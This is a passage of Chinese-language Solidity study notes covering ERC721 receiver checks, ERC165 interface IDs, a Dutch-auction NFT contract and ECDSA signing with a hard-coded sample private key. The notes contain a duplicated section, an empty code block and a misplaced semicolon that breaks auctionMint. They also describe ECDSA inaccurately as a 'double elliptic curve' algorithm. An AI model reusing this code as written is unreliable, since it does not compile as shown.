(to.code.length&gt;0)&#123;<br>            // try IERC721Receiver(to).onERC721Received(msg.sender, from, tokenId, data)<br>            try IERC721Receiver(to).onERC721Received(msg.sender,from,tokenId,data) returns(bytes4 retval)&#123;<br>                if (retval != IERC721Receiver.onERC721Received.selector)&#123;<br>                    revert ERC721InvalidReceiver(to);<br>                &#125;<br><br>            &#125;catch (bytes memory reason)&#123;<br>                if (reason.length==0)&#123;<br>                    revert ERC721InvalidReceiver(to);<br>                &#125;else &#123;<br>                    /// @solidity memory-safe-assembly<br>                    assembly&#123;<br>                        //使用 assembly 关键字，可以直接操作 EVM（以太坊虚拟机）的底层。<br>                        revert(add(32,reason),mload(reason))<br>                        //add(32, reason): 由于 reason 的前 32 字节存储的是数组长度，真正的错误信息从第 32 字节开始，因此通过 add(32, reason) 获取实际错误信息的起始位置。<br>                        //revert: 使用 revert 指令抛出错误，将 reason 的内容作为错误消息。<br><br>                    &#125;<br>                    <br>                &#125;<br><br>            &#125;<br>        &#125;<br>    &#125;<br>    /**<br>     * 实现IERC721Metadata的tokenURI函数，查询metadata。<br>     */<br>    function tokenURI(uint256 tokenId) external view override  returns (string memory)&#123;<br>        // 根据tokenId查询他的元数据<br><br>        // 先判断非0<br>        require(_owners[tokenId]!=address(0),&quot;Token Not Exist&quot;);<br>        string memory baseURI=_baseURI();<br>        return bytes(baseURI).length&gt;0 ? string(abi.encodePacked(baseURI,tokenId.toString())) : &quot;&quot;;<br><br>    &#125;<br>        /**<br>     * 计算&#123;tokenURI&#125;的BaseURI，tokenURI就是把baseURI和tokenId拼接在一起，需要开发重写。<br>     * BAYC的baseURI为ipfs://QmeSjSinHpPnmXmspMjwiXyN6zS4E9zccariGR3jxcaWtq/ <br>     */<br>    function _baseURI()internal view virtual returns (string memory) &#123;<br>        return &quot;&quot;;<br>    &#125;<br><br>&#125;<br><br><br></code></pre></td></tr></table></figure><h2 id="发行ERC721NFT"><a href="#发行ERC721NFT" class="headerlink" title="发行ERC721NFT"></a>发行<code>ERC721</code>NFT</h2><p>有了<code>ERC721</code>标准后，在<code>ETH</code>链上发行NFT变得非常简单。现在，我们发行属于我们的NFT。</p><p>在<code>Remix</code>上编译好<code>ERC721</code>合约和<code>WTFApe</code>合约（按照顺序），在部署栏点击下按钮，输入构造函数的参数，<code>name_</code>和<code>symbol_</code>都设为<code>WTF</code>，然后点击<code>transact</code>键进行部署。</p><p>这样，我们就创建好了<code>WTF</code>NFT。我们需要运行<code>mint()</code>函数来给自己铸造一些代币。在<code>mint</code>函数那一栏点开右侧的下按钮输入账户地址，和tokenid，并点击<code>mint</code>按钮，为自己铸造<code>0</code>号<code>WTF</code>NFT。</p><p>可以点开右侧的Debug按钮，具体查看下面的logs。</p><p>里面包含四个关键信息：</p><ul><li>事件<code>Transfer</code></li><li>铸造地址<code>0x0000000000000000000000000000000000000000</code></li><li>接收地址<code>0x5B38Da6a701c568545dCfcB03FcB875f56beddC4</code></li><li>tokenid<code>0</code></li></ul><p>我们利用<code>balanceOf()</code>函数来查询账户余额。输入我们当前的账户，可以看到有一个<code>NFT</code>，铸造成功。</p><p>账户信息如图左侧，右侧标注为函数执行的具体信息。</p><p>我们也可以利用<code>ownerOf()</code>函数来查询NFT属于哪个账户。输入<code>tokenid</code>，可以我们的地址，查询无误。</p><h2 id="ERC165与ERC721详解"><a href="#ERC165与ERC721详解" class="headerlink" title="ERC165与ERC721详解"></a>ERC165与ERC721详解</h2><p>上面说到,为了防止NFT被转到一个没有能力操作NFT的合约中去,目标必须正确实现ERC721TokenReceiver接口：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">interface ERC721TokenReceiver &#123;<br>    function onERC721Received(<span class="hljs-keyword">address </span>_operator, <span class="hljs-keyword">address </span>_from, uint256 _tokenId, <span class="hljs-keyword">bytes </span>_data) <span class="hljs-keyword">external </span>returns(<span class="hljs-keyword">bytes4);</span><br><span class="hljs-keyword"></span>&#125;<br></code></pre></td></tr></table></figure><p>拓展到编程语言的世界中去，无论是Java的interface，还是Rust的Trait(当然solidity中和trait更像的是library)，只要是和接口沾边的，都在透露着一种这样的意味：接口是某些行为的集合(在solidity中更甚，接口完全等价于函数选择器的集合)，某个类型只要实现了某个接口，就表明该类型拥有这样的一种功能。因此，只要某个contract类型实现了上述的<code>ERC721TokenReceiver</code>接口(更具体而言就是实现了<code>onERC721Received</code>这个函数),该contract类型就对外表明了自己拥有管理NFT的能力。当然操作NFT的逻辑被实现在该合约其他的函数中。 ERC721标准在执行<code>safeTransferFrom</code>的时候会检查目标合约是否实现了<code>onERC721Received</code>函数,这是一种利用ERC165思想进行的操作。</p><h2 id="ERC165与ERC721详解-1"><a href="#ERC165与ERC721详解-1" class="headerlink" title="ERC165与ERC721详解"></a>ERC165与ERC721详解</h2><p>上面说到,为了防止NFT被转到一个没有能力操作NFT的合约中去,目标必须正确实现ERC721TokenReceiver接口：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">interface ERC721TokenReceiver &#123;<br>    function onERC721Received(<span class="hljs-keyword">address </span>_operator, <span class="hljs-keyword">address </span>_from, uint256 _tokenId, <span class="hljs-keyword">bytes </span>_data) <span class="hljs-keyword">external </span>returns(<span class="hljs-keyword">bytes4);</span><br><span class="hljs-keyword"></span>&#125;<br></code></pre></td></tr></table></figure><p>拓展到编程语言的世界中去，无论是Java的interface，还是Rust的Trait(当然solidity中和trait更像的是library)，只要是和接口沾边的，都在透露着一种这样的意味：接口是某些行为的集合(在solidity中更甚，接口完全等价于函数选择器的集合)，某个类型只要实现了某个接口，就表明该类型拥有这样的一种功能。因此，只要某个contract类型实现了上述的<code>ERC721TokenReceiver</code>接口(更具体而言就是实现了<code>onERC721Received</code>这个函数),该contract类型就对外表明了自己拥有管理NFT的能力。当然操作NFT的逻辑被实现在该合约其他的函数中。 ERC721标准在执行<code>safeTransferFrom</code>的时候会检查目标合约是否实现了<code>onERC721Received</code>函数,这是一种利用ERC165思想进行的操作。</p><p><strong>那究竟什么是ERC165呢?</strong><br>ERC165是一种对外表明自己实现了哪些接口的技术标准。就像上面所说的，实现了一个接口就表明合约拥有种特殊能力。有一些合约与其他合约交互时，期望目标合约拥有某些功能，那么合约之间就能够通过ERC165标准对对方进行查询以检查对方是否拥有相应的能力。<br>以ERC721合约为例，当外部对某个合约进行检查其是否是ERC721时，<a href="https://eips.ethereum.org/EIPS/eip-165#how-to-detect-if-a-contract-implements-erc-165">怎么做？</a> 。按照这个说法，检查步骤应该是首先检查该合约是否实现了ERC165, 再检查该合约实现的其他特定接口。此时该特定接口是IERC721. IERC721的是ERC721的基本接口(为什么说基本，是因为还有其他的诸如<code>ERC721Metadata</code> <code>ERC721Enumerable</code> 这样的拓展)：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/// 注意这个**0x80ac58cd**<br>///  **⚠⚠⚠ Note: the ERC-165 identifier for this interface is 0x80ac58cd. ⚠⚠⚠**<br>interface ERC721 /* is ERC165 */ &#123;<br>    event Transfer(address indexed _from, address indexed _to, uint256 indexed _tokenId);<br><br>    event Approval(address indexed _owner, address indexed _approved, uint256 indexed _tokenId);<br><br>    event ApprovalForAll(address indexed _owner, address indexed _operator, bool _approved);<br><br>    function balanceOf(address _owner) external view returns (uint256);<br><br>    function ownerOf(uint256 _tokenId) external view returns (address);<br><br>    function safeTransferFrom(address _from, address _to, uint256 _tokenId, bytes data) external payable;<br><br>    function safeTransferFrom(address _from, address _to, uint256 _tokenId) external payable;<br><br>    function transferFrom(address _from, address _to, uint256 _tokenId) external payable;<br><br>    function approve(address _approved, uint256 _tokenId) external payable;<br><br>    function setApprovalForAll(address _operator, bool _approved) external;<br><br>    function getApproved(uint256 _tokenId) external view returns (address);<br><br>    function isApprovedForAll(address _owner, address _operator) external view returns (bool);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>0x80ac58cd</strong>&#x3D; <code>bytes4(keccak256(ERC721.Transfer.selector) ^ keccak256(ERC721.Approval.selector) ^ ··· ^keccak256(ERC721.isApprovedForAll.selector))</code>，这是ERC165规定的计算方式。</p><p>那么，类似的，能够计算出ERC165本身的接口(它的接口里只有一个 <code>function supportsInterface(bytes4 interfaceID) external view returns (bool);</code> 函数，对其进行<code>bytes4(keccak256(supportsInterface.selector))</code> 得到<strong>0x01ffc9a7</strong>。此外，ERC721还定义了一些拓展接口，比如<code>ERC721Metadata</code> ，长这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs solidity">///  Note: the ERC-165 identifier for this interface is 0x5b5e139f.<br>interface ERC721Metadata /* is ERC721 */ &#123;<br>    function name() external view returns (string _name);<br>    function symbol() external view returns (string _symbol);<br>    function tokenURI(uint256 _tokenId) external view returns (string); // 这个很重要，前端展示的小图片的链接都是这个函数返回的<br>&#125;<br></code></pre></td></tr></table></figure><p>这个<strong>0x5b5e139f</strong> 的计算就是:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs solidity">IERC721Metadata.name.selector ^ IERC721Metadata.symbol.selector ^ IERC721Metadata.tokenURI.selector<br></code></pre></td></tr></table></figure><p>solmate实现的<a href="https://github.com/transmissions11/solmate/blob/main/src/tokens/ERC721.sol">ERC721.sol</a>是怎么完成这些ERC165要求的特性的呢？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function supportsInterface(bytes4 interfaceId) public view virtual returns (bool) &#123;<br>        return<br>            interfaceId == 0x01ffc9a7 || // ERC165 Interface ID for ERC165<br>            interfaceId == 0x80ac58cd || // ERC165 Interface ID for ERC721<br>            interfaceId == 0x5b5e139f; // ERC165 Interface ID for ERC721Metadata<br>&#125;<br></code></pre></td></tr></table></figure><p>没错就这么简单。当外界按照<a href="https://eips.ethereum.org/EIPS/eip-165#how-to-detect-if-a-contract-implements-erc-165">link1</a> 的步骤去做检查的时候，如果外界想检查这个合约是否实现了165,好说，就是supportsInterface函数在入参是<code>0x01ffc9a7</code>时必须返回true，在入参是<code>0xffffffff</code>时，返回值必须是false。上述实现完美达成要求。</p><p>当外界想检查这个合约是否是ERC721的时候，好说，入参是<strong>0x80ac58cd</strong> 的时候表明外界想做这个检查。返回true。</p><p>当外界想检查这个合约是否实现ERC721的拓展ERC721Metadata接口时，入参是0x5b5e139f。好说，返回了true。</p><p>并且由于该函数是virtual的。因此该合约的使用者可以继承该合约，然后继续实现<code>ERC721Enumerable</code> 接口。实现完里面的什么<code>totalSupply</code> 啊之类的函数之后，把继承的<code>supportsInterface</code>重实现为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function supportsInterface(bytes4 interfaceId) public view virtual returns (bool) &#123;<br>        return<br>            interfaceId == 0x01ffc9a7 || // ERC165 Interface ID for ERC165<br>            interfaceId == 0x80ac58cd || // ERC165 Interface ID for ERC721<br>            interfaceId == 0x5b5e139f || // ERC165 Interface ID for ERC721Metadata<br>            interfaceId == 0x780e9d63;   // ERC165 Interface ID for ERC721Enumerable<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>优雅，简洁，可拓展性拉满。</strong></p><h1 id="35-荷兰拍卖DutchAuction"><a href="#35-荷兰拍卖DutchAuction" class="headerlink" title="35. 荷兰拍卖DutchAuction"></a>35. 荷兰拍卖<code>DutchAuction</code></h1><p>荷兰拍卖就是减价拍卖，越往后越低</p><p><img src="/img/web3/35-1.png"></p><p>在币圈，很多<code>NFT</code>通过荷兰拍卖发售，其中包括<code>Azuki</code>和<code>World of Women</code>，其中<code>Azuki</code>通过荷兰拍卖筹集了超过<code>8000</code>枚<code>ETH</code>。</p><p>项目方非常喜欢这种拍卖形式，主要有两个原因</p><ol><li>荷兰拍卖的价格由最高慢慢下降，能让项目方获得最大的收入。</li><li>拍卖持续较长时间（通常6小时以上），可以避免<code>gas war</code></li></ol><p>代码基于<code>Azuki</code>的<a href="https://etherscan.io/address/0xed5af388653567af2f388e6224dc7c4b3241c544#code">代码</a>简化而成。<code>DucthAuction</code>合约继承了之前介绍的<code>ERC721</code>和<code>Ownable</code>合约：</p><figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs d"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span><br><span class="hljs-keyword">pragma</span> solidity ^<span class="hljs-number">0.8</span><span class="hljs-number">.21</span>;<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;@openzeppelin/contracts/access/Ownable.sol&quot;</span>;<br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;https://github.com/AmazingAng/WTF-Solidity/blob/main/34_ERC721/ERC721.sol&quot;</span>;<br><br>contract DutchAuction <span class="hljs-keyword">is</span> Ownable, ERC721 &#123;<br></code></pre></td></tr></table></figure><h3 id="DutchAuction状态变量"><a href="#DutchAuction状态变量" class="headerlink" title="DutchAuction状态变量"></a><code>DutchAuction</code>状态变量</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs solidity"><br></code></pre></td></tr></table></figure><h3 id="DutchAuction状态变量-1"><a href="#DutchAuction状态变量-1" class="headerlink" title="DutchAuction状态变量"></a><code>DutchAuction</code>状态变量</h3><p>合约中一共有<code>9</code>个状态变量，其中有<code>6</code>个和拍卖相关，他们是：</p><ul><li><code>COLLECTION_SIZE</code>：NFT总量。</li><li><code>AUCTION_START_PRICE</code>：荷兰拍卖起拍价，也是最高价。</li><li><code>AUCTION_END_PRICE</code>：荷兰拍卖结束价，也是最低价&#x2F;地板价。</li><li><code>AUCTION_TIME</code>：拍卖持续时长。</li><li><code>AUCTION_DROP_INTERVAL</code>：每过多久时间，价格衰减一次。</li><li><code>auctionStartTime</code>：拍卖起始时间（区块链时间戳，<code>block.timestamp</code>）。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs solidity">uint256 public constant COLLECTION_SIZE = 10000; // NFT总数<br>uint256 public constant AUCTION_START_PRICE = 1 ether; // 起拍价(最高价)<br>uint256 public constant AUCTION_END_PRICE = 0.1 ether; // 结束价(最低价/地板价)<br>uint256 public constant AUCTION_TIME = 10 minutes; // 拍卖时间，为了测试方便设为10分钟<br>uint256 public constant AUCTION_DROP_INTERVAL = 1 minutes; // 每过多久时间，价格衰减一次<br>uint256 public constant AUCTION_DROP_PER_STEP =<br>(AUCTION_START_PRICE - AUCTION_END_PRICE) /<br>    (AUCTION_TIME / AUCTION_DROP_INTERVAL); // 每次价格衰减步长<br>uint256 public auctionStartTime; // 拍卖开始时间戳<br>string private _baseTokenURI;   // metadata URI<br>uint256[] private _allTokens; // 记录所有存在的tokenId <br></code></pre></td></tr></table></figure><h3 id="DutchAuction函数"><a href="#DutchAuction函数" class="headerlink" title="DutchAuction函数"></a><code>DutchAuction</code>函数</h3><p>荷兰拍卖合约中共有<code>9</code>个函数，与<code>ERC721</code>相关的函数我们这里不再重复介绍，只介绍和拍卖相关的函数。</p><ul><li>设定拍卖起始时间：我们在构造函数中会声明当前区块时间为起始时间，项目方也可以通过<code>setAuctionStartTime()</code>函数来调整：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs solidity">   constructor() Ownable(msg.sender) ERC721(&quot;WAYNE Dutch Auction&quot;,&quot;WAYNE Dutch Auction&quot;)&#123;<br>    auctionStartTime=block.timestamp;<br>&#125;<br>// auctionStartTime setter函数，onlyOwner  设置时间函数<br>function setAuctionStartTime(uint32 timestamp)external onlyOwner &#123;<br>    auctionStartTime=timestamp; // 修改拍卖开始函数<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>获取拍卖实时价格：<code>getAuctionPrice()</code>函数通过当前区块时间以及拍卖相关的状态变量来计算实时拍卖价格。</li></ul><p>当<code>block.timestamp</code>小于起始时间，价格为最高价<code>AUCTION_START_PRICE</code>；</p><p>当<code>block.timestamp</code>大于结束时间，价格为最低价<code>AUCTION_END_PRICE</code>；</p><p>当<code>block.timestamp</code>处于两者之间时，则计算出当前的衰减价格。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs solidity"><br>// 获取买牌实时价格<br>function getAuctionPrice()public view returns (uint256) &#123;<br>    if (block.timestamp &lt; auctionStartTime)&#123; <br>        // 如果区块时间小小于设定的开始时间，就是拍卖起始价（还没开始减价）<br>        return AUCTION_START_PRICE;<br>        &#125;else if (block.timestamp-auctionStartTime&gt;=AUCTION_TIME)&#123;<br>            // 区块时间减去开始时间大于拍卖时间，就说明已经到地板价了<br>            return AUCTION_END_PRICE;<br>        &#125;else &#123;<br>            uint256 steps=(block.timestamp-auctionStartTime)/AUCTION_DROP_INTERVAL;<br>            // 其他时间 就是非起拍价 非地板价的时候，<br>            // 就是看时间差除以均分计算衰减价差<br>            return AUCTION_START_PRICE-(steps * AUCTION_DROP_PER_STEP);<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>用户拍卖并铸造<code>NFT</code>：用户通过调用<code>auctionMint()</code>函数，支付<code>ETH</code>参加荷兰拍卖并铸造<code>NFT</code>。</li></ul><p>该函数首先检查拍卖是否开始&#x2F;铸造是否超出<code>NFT</code>总量。接着，合约通过<code>getAuctionPrice()</code>和铸造数量计算拍卖成本，并检查用户支付的<code>ETH</code>是否足够：如果足够，则将<code>NFT</code>铸造给用户，并退回超额的<code>ETH</code>；反之，则回退交易。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function auctionMint(uint256 quantity) external payable &#123;<br>    uint256 _saleStartTime = uint256(auctionStartTime);// 为什么要赋值？建立local变量，减少gas花费<br>    require(<br>        _saleStartTime!=0 &amp;&amp; block.timestamp &gt; _saleStartTime, <br>        &quot;sale has not started yet&quot;;)//检查是否设置起拍时间，拍卖是否开始<br>    require(totalSupply()+quantity &lt;= COLLECTION_SIZE,<br>    &quot;not enough remaining reserved for auction to support desired mint amount&quot;);//检查NFT总数是否超过上限<br>    uint256 totalCost = getAuctionPrice()*quantity;// 当前拍卖价*拍卖数量=总成本<br>    require(msg.value&gt;=totalCost,&quot;Need to send more ETH.&quot;);// 检查用户是否支付足够的eth<br>    // 如果用户付够了钱，就开始铸造NFT<br>    // Mint NFT<br>    for(uint256 i=0;i&lt;quantity;i++)&#123;<br>        uint256 mintIndex=totalSupply();//<br>        _mint(msg.sender,mintIndex);<br>        _addTokenToAllTokensEnumeration(mintIndex);<br>    &#125;<br>    if (msg.value&gt;totalCost)&#123;<br>        payable (msg.sender).transfer(msg.value-totalCost);// 注意一下这里是否有重入的风险<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>项目方取出筹集的<code>ETH</code>：项目方可以通过<code>withdrawMoney()</code>函数提走拍卖筹集的<code>ETH</code>。</li></ul><p>再加上一些其他的代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function totalSupply()public   view returns (uint256)  &#123;<br>    return _allTokens.length;<br>&#125;<br>function _addTokenToAllTokensEnumeration(uint256 tokenId)private  &#123;<br>    _allTokens.push(tokenId);<br>&#125;<br>function _baseURI() internal view virtual override returns (string memory)&#123;<br>    return _baseTokenURI;<br><br>&#125;<br>function setBaseURI(string calldata baseURI)external onlyOwner &#123;<br>    _baseTokenURI=baseURI;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h2><p>1 合约部署</p><p><img src="/img/web3/35-2.png"></p><p>2 荷兰拍卖：随后，可以通过<code>getAuctionPrice()</code>函数获取到<strong>当前</strong>的拍卖价格。可以观察到，拍卖开始前的价格为<code>起拍价 AUCTION_START_PRICE</code>随着拍卖进行，拍卖价格在逐渐降低，直到降低至<code>地板价 AUCTION_END_PRICE</code>后不再变化。</p><p><img src="/img/web3/35-3.png"></p><p>3 Mint操作：通过<code>auctionMint()</code>函数，完成mint，可以看见本例中，由于时间已经超过拍卖时间，因此仅耗费了<code>地板价</code>就完成了拍卖。</p><p><img src="/img/web3/35-4.png"></p><p>4 提取ETH：直接通过withdrawMoney()函数，便能将筹集到的ETH通过call()发送到合约创建者的地址。</p><h1 id="36-默克尔树-Merkle-Tree【未学】"><a href="#36-默克尔树-Merkle-Tree【未学】" class="headerlink" title="36. 默克尔树 Merkle Tree【未学】"></a>36. 默克尔树 Merkle Tree【未学】</h1><h1 id="37-数字签名-Signature"><a href="#37-数字签名-Signature" class="headerlink" title="37. 数字签名 Signature"></a>37. 数字签名 Signature</h1><p>以太坊使用的数字签名算法叫双椭圆曲线数字签名算法（<code>ECDSA</code>），基于双椭圆曲线“私钥-公钥”对的数字签名算法。它主要起到了<a href="https://en.wikipedia.org/wiki/Digital_signature">三个作用</a>：</p><ol><li><strong>身份认证</strong>：证明签名方是私钥的持有人。</li><li><strong>不可否认</strong>：发送方不能否认发送过这个消息。</li><li><strong>完整性</strong>：通过验证针对传输消息生成的数字签名，可以验证消息是否在传输过程中被篡改。</li></ol><h2 id="ECDSA合约"><a href="#ECDSA合约" class="headerlink" title="ECDSA合约"></a><code>ECDSA</code>合约</h2><p><code>ECDSA</code>标准中包含两个部分：</p><ol><li>签名者利用<code>私钥</code>（隐私的）对<code>消息</code>（公开的）创建<code>签名</code>（公开的）。</li><li>其他人使用<code>消息</code>（公开的）和<code>签名</code>（公开的）恢复签名者的<code>公钥</code>（公开的）并验证签名。 我们将配合<code>ECDSA</code>库讲解这两个部分。本教程所用的<code>私钥</code>，<code>公钥</code>，<code>消息</code>，<code>以太坊签名消息</code>，<code>签名</code>如下所示：</li></ol><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">私钥: 0x227dbb8586117d55284e26620bc76534dfbd2394be34cf4a09cb775d593b6f2b</span><br><span class="hljs-section">公钥: 0xe16C1623c1AA7D919cd2241d8b36d9E79C1Be2A2</span><br><span class="hljs-section">消息: 0x1bf2c0ce4546651a1a2feb457b39d891a6b83931cc2454434f39961345ac378c</span><br><span class="hljs-section">以太坊签名消息: 0xb42ca4636f721c7a331923e764587e98ec577cea1a185f60dfcc14dbb9bd900b</span><br><span class="hljs-section">签名: 0x390d704d7ab732ce034203599ee93dd5d3cb0d4d1d7c600ac11726659489773d559b12d220f99f41d17651b0c1c6a669d346a397f8541760d6b32a5725378b241c</span><br></code></pre></td></tr></table></figure><h3 id="创建签名"><a href="#创建签名" class="headerlink" title="创建签名"></a>创建签名</h3><p><strong>1. 打包消息：</strong> 在以太坊的<code>ECDSA</code>标准中，被签名的<code>消息</code>是一组数据的<code>keccak256</code>哈希，为<code>bytes32</code>类型。我们可以把任何想要签名的内容利用<code>abi.encodePacked()</code>函数打包，然后用<code>keccak256()</code>计算哈希，作为<code>消息</code>。我们例子中的<code>消息</code>是由一个<code>address</code>类型变量和一个<code>uint256</code>类型变量得到的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/*<br> * 将mint地址（address类型）和tokenId（uint256类型）拼成消息msgHash<br> * _account: 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4<br> * _tokenId: 0<br> * 对应的消息msgHash: 0x1bf2c0ce4546651a1a2feb457b39d891a6b83931cc2454434f39961345ac378c<br> */<br>function getMessageHash(address _account, uint256 _tokenId) public pure returns(bytes32)&#123;<br>    return keccak256(abi.encodePacked(_account, _tokenId));<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>2. 计算以太坊签名消息：</strong> <code>消息</code>可以是能被执行的交易，也可以是其他任何形式。为了避免用户误签了恶意交易，<code>EIP191</code>提倡在<code>消息</code>前加上<code>&quot;\x19Ethereum Signed Message:\n32&quot;</code>字符，并再做一次<code>keccak256</code>哈希，作为<code>以太坊签名消息</code>。经过<code>toEthSignedMessageHash()</code>函数处理后的消息，不能被用于执行交易: </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/**<br> * @dev 返回 以太坊签名消息<br> * `hash`：消息<br> * 遵从以太坊签名标准：https://eth.wiki/json-rpc/API#eth_sign[`eth_sign`]<br> * 以及`EIP191`:https://eips.ethereum.org/EIPS/eip-191`<br> * 添加&quot;\x19Ethereum Signed Message:\n32&quot;字段，防止签名的是可执行交易。<br> */<br>function toEthSignedMessageHash(bytes32 hash) public pure returns (bytes32) &#123;<br>    // 哈希的长度为32<br>    return keccak256(abi.encodePacked(&quot;\x19Ethereum Signed Message:\n32&quot;, hash));<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>3-2. 利用web3.py签名：</strong> 批量调用中更倾向于使用代码进行签名，以下是基于web3.py的实现。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs solidity">from web3 import Web3, HTTPProvider<br>from eth_account.messages import encode_defunct<br><br>private_key = &quot;0x227dbb8586117d55284e26620bc76534dfbd2394be34cf4a09cb775d593b6f2b&quot;<br>address = &quot;0x5B38Da6a701c568545dCfcB03FcB875f56beddC4&quot;<br>rpc = &#x27;https://rpc.ankr.com/eth&#x27;<br>w3 = Web3(HTTPProvider(rpc))<br><br>#打包信息<br>msg = Web3.solidity_keccak([&#x27;address&#x27;,&#x27;uint256&#x27;], [address,0])<br>print(f&quot;消息：&#123;msg.hex()&#125;&quot;)<br>#构造可签名信息<br>message = encode_defunct(hexstr=msg.hex())<br>#签名<br>signed_message = w3.eth.account.sign_message(message, private_key=private_key)<br>print(f&quot;签名：&#123;signed_message[&#x27;signature&#x27;].hex()&#125;&quot;)<br></code></pre></td></tr></table></figure><h3 id="验证签名"><a href="#验证签名" class="headerlink" 